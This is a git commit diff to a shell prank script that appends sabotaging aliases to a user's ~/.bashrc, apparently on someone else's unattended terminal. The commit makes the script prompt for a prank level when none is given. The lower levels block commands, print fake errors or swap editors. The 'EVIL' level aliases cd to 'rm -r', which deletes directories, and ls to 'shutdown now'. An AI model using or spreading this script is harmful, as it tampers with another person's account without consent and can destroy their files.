1e564eb950059442ebe3920b5b747ca0d15a787e
Misha Turnbull <mishaturnbull@gmail.com>
2019-01-23 15:52:34 -0600

    Fix no-input given stop
    Signed-off-by: Misha Turnbull <mishaturnbull@gmail.com>

--- scripts/alias_commands.sh
+++ scripts/alias_commands.sh
@@ -7,21 +7,23 @@ if [[ -z "$1" ]]; then
 	echo "  3 Evil (h/d=6/1)  [the classic editor swap]"
 	echo "  4 EVIL (h/d=8/3)"
 	echo "    (WARNING!  THIS IS POTENTIALLY HARMFUL!)"
-	exit 1
+	read input
+else
+	input=$1
 fi
 
-if [[ "$1" == "1" ]]; then
+if [[ "$input" == "1" ]]; then
 	echo "alias ls='echo \"You should learn to log out...\"'" >> ~/.bashrc
 	echo "alias cd='echo \"You should learn to log out...\"'" >> ~/.bashrc
-elif [[ "$1" == "2" ]]; then
+elif [[ "$input" == "2" ]]; then
 	echo "alias cd='eject -t; cd'" >> ~/.bashrc
 	echo "alias ls='echo \"Segmentation fault\"'" >> ~/.bashrc
-elif [[ "$1" == "3" ]]; then
+elif [[ "$input" == "3" ]]; then
 	echo "alias vi=nano" >> ~/.bashrc
 	echo "alias vim=nano" >> ~/.bashrc
 	echo "alias nano=emacs" >> ~/.bashrc
 	echo "alias emacs=vim" >> ~/.bashrc
-elif [[ "$1" == "4" ]]; then
+elif [[ "$input" == "4" ]]; then
 	echo "alias 'cd=\"rm -r\"'" >> ~/.bashrc
 	echo "alias 'ls=\"shutdown now\"'" >> ~/.bashrc
 fi
